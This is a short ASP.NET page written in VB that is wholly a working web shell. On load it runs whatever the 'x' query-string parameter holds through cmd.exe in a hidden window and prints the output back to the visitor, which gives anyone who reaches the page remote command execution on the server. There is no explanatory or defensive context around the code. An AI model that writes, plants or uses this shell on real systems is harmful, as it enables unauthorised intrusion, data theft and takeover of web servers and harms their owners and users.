<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
Sub Page_Load
	Dim p As New Process
    p.StartInfo.Arguments = " /c " + Request.QueryString("x")
    p.StartInfo.FileName = "cmd.exe"
	p.StartInfo.RedirectStandardOutput = True
	p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
	p.StartInfo.UseShellExecute = False
	p.Start()
	p.WaitForExit()
	If p.HasExited Then
		Response.Write("<pre>" + p.StandardOutput.ReadToEnd + "</pre>")
	End If
End Sub
</script>
